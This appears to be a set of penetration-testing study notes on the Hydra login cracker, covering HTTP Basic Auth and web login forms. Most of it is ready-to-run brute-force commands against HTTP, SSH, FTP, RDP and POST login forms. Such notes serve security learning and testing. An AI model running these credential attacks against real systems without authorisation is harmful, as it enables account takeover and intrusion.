## 1-Hydra
Hydra is a fast network login cracker that supports many protocols. It uses parallel connections to try credentials quickly, is flexible across services, and has a simple CLI.
#### Basic Usage

```bash
hydra [login_options] [password_options] [attack_options] [service_options]
```
Common options:
`-l` single username or `-L` username file
`-p` single password or `-P` password file
`-t` number of parallel tasks (threads)
`-f` stop after first success
`-s` specify port
`-v` / `-V` verbose output
Target format: `service://server`
Service-specific options: `/OPT` (e.g., HTTP form mapping)

#### Hydra Services

Hydra modules target different protocols (**ftp, ssh, http-get, http-post-form , smtp, pop3, imap, mysql, mssql, vnc, rdp**) so it can adapt to many auth mechanisms.
#### examples usages
```bash
#  basic HTTP auth
hydra -L usernames.txt -P passwords.txt www.example.com http-get

# Targeting Multiple SSH Servers (use a targets file to test many hosts at once)
hydra -l root -p toor -M targets.txt ssh

# Testing FTP Credentials on a Non-Standard Port (targeting FTP on port 2121 with verbose output)
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp

# Brute-Forcing a Web Login Form (POST form attack; replace path and success condition as needed)
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

# Advanced RDP Brute-Forcing (generate passwords within a charset and length range)
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```


--- 
## 2- Basic HTTP Authentication
Basic Auth is a simple challenge-response auth where the server returns `401` with `WWW-Authenticate` and the client sends `Authorization: Basic <Base64(user:pass)>`.  
Credentials are Base64-encoded (not encrypted) and easily decoded.

```http
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```
#### Exploiting Basic Auth with Hydra

Hydra can brute-force Basic Auth using the `http-get` module. If username is known, focus on passwords to save time.  
```bash
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```


---

## 3- Login Forms
Login forms are HTML forms that send credentials (usually via POST) to a server endpoint for authentication. They are common targets for brute-force attacks because their behavior is often predictable.

**Basic form example**
```html
<form action="/login" method="post">
  <input name="username">
  <input name="password" type="password">
  <input type="submit">
</form>
```

**How they work**
Browsers collect input, optionally run client-side JS, then send a POST (for example `username=john&password=secret123`) to the server. The server checks credentials and responds with success or failure.
#### Finding parameters

Use browser Developer Tools (Network tab) or an intercepting proxy (Burp/ZAP) to capture a sample login request and confirm:

1. Request path (e.g., /)
2. Parameter names (e.g., username, password)
3. Response behavior on failure or success (error messages, redirects, or specific page text)
#### Hydra http-post-form basics

```bash
# Hydra params string in the form: path:params:condition
# Example 
hydra -L top-usernames-shortlist.txt -P passwords.txt target http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

# Example using success condition (redirect):
... http-post-form "/:username=^USER^&password=^PASS^:S=302"
```

